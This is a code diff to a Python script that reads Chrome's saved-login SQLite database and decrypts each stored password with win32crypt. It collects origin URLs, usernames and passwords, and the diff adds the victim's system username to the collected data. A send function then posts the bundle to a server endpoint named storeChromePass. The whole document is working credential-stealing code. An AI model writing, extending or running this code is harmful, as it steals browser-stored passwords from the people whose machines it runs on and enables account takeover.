@@ -1,6 +1,7 @@
 import os
 import sqlite3
 import requests
+import getpass
 try:
     import win32crypt
 except:
@@ -11,7 +12,9 @@ def main():
 
 
 def getpasswords():
-    info_list = []
+
+    dataToBeSent = {}
+    dataList = []
     path = getpath()
     try:
         connection = sqlite3.connect(path + "Login Data")
@@ -25,7 +28,7 @@ def getpasswords():
                 password, None, None, None, 0)[1]
 
             if password:
-                info_list.append({
+                dataList.append({
                     'origin_url': origin_url,
                     'username': username,
                     'password': str(password)[2:-1]
@@ -42,8 +45,9 @@ def getpasswords():
         else:
             print(e)
 
-    info_list.append(info_list[0])
-    return info_list
+    dataToBeSent["user"] = getpass.getuser()
+    dataToBeSent["passwords"] = dataList
+    return dataToBeSent
 
 def send():
     url = "http://localhost:3000/users/storeChromePass"
